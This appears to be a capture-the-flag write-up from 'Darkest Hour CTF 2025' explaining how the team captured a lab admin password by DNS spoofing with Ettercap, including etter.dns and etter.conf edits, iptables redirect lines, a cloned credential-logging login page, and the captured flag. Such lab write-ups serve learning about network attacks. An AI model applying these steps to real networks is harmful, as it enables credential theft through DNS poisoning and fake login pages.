---
title: "Capturing the Admin Password via DNS Spoofing"
eventName: "Darkest Hour CTF 2025"
category: "Network"
difficulty: "Hard"
points: 800
---

# Final Challenge: Capturing the Admin Password via DNS Spoofing

The goal was to obtain the **admin password**. Earlier, when intercepting traffic between the victim and the server, we captured what appeared to be a password, but it was actually a **hash**. Upon examining the source code of the login page, we discovered that **password hashing was performed client-side using SHA-256** before transmission. This meant that intercepting the traffic would not reveal the actual password, as a strong hash is practically unbreakable.

Since traditional credential interception wouldn’t work, we had to find an alternative approach.

---

## Understanding the Context

- The **admin credentials were being entered periodically** — implying some automated login mechanism (likely a bot).
- The victim accessed the website using a **custom DNS server**, which translated valentine.com to 192.168.153.20.
- This was a **network pentesting challenge**, meaning the solution likely involved **manipulating network traffic**.

This led us to explore **DNS spoofing**, an attack where an attacker **forges DNS responses** to redirect the victim to a malicious server. In this case, we could set up our own **fake version of** valentine.com that would **log credentials in plaintext** instead of hashing them.

---

## Executing the Attack

### Setting Up the Fake Website

We hosted our own version of valentine.com, keeping the login interface identical but modifying it to store and display any submitted credentials **without hashing**.

### Modifying Ettercap Configuration

To spoof the DNS response and redirect the victim to our malicious server, we modified **Ettercap’s DNS configuration**:

**Edit /etc/ettercap/etter.dns** and add:
```
valentine.com A 192.168.153.211  # Attacker’s IP
```

**Edit /etc/ettercap/etter.conf** and uncomment:
```bash
[privs]
ec_uid = 0
ec_gid = 0
```

### Enable Packet Redirection (Linux)

```bash
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %dest_ip --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %dest_ip --dport %port -j REDIRECT --to-port %rport"
```

### Running the Attack

With everything configured, we launched Ettercap, selected our targets (the victim and the gateway), and enabled the **DNS spoofing plugin**.

This **poisoned the DNS cache** of the victim’s machine, ensuring that any request to valentine.com was redirected to our **malicious login page**.

### Capturing the Credentials

Moments after launching the attack, we observed an incoming login request — this time, the password **was not hashed**.

![Ettercap Credentials Capture](/assets/darkest/ettercap.webp)

The admin’s plaintext password was successfully captured: My_C00kies_werent_En0ugh?
